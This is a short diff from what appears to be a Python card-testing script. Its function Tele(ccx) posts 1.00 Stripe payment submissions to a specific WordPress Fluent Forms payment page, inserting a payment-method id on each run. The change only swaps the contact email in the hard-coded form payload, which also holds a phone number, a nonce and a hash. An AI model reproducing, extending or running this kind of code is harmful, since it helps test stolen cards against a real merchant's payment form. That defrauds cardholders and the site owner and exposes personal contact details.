@@ -59,7 +59,7 @@ def Tele(ccx):
 	}
 
 	data = {
-			'data': '__fluent_form_embded_post_id=272&_fluentform_3_fluentformnonce=73d21d956f&_wp_http_referer=%2Fpayments%2F&custom-payment-amount=1.00&payment_method=stripe&names%5Bfirst_name%5D=Rein&names%5Bmiddle_name%5D=Lee%20pro&names%5Blast_name%5D=Pro&email=rein48287%40gmail.com&phone=%2B959943669328&dropdown=Vehicles&__entry_intermediate_hash=a2d9ab429c3cf07e9bb27d3bcd4a1d56&__stripe_payment_method_id='+str(pm)+'',
+			'data': '__fluent_form_embded_post_id=272&_fluentform_3_fluentformnonce=73d21d956f&_wp_http_referer=%2Fpayments%2F&custom-payment-amount=1.00&payment_method=stripe&names%5Bfirst_name%5D=Rein&names%5Bmiddle_name%5D=Lee%20pro&names%5Blast_name%5D=Pro&email=waznimey2022%40gmail.com&phone=%2B959943669328&dropdown=Vehicles&__entry_intermediate_hash=a2d9ab429c3cf07e9bb27d3bcd4a1d56&__stripe_payment_method_id='+str(pm)+'',
 			'action': 'fluentform_submit',
 			'form_id': '3',
 	}
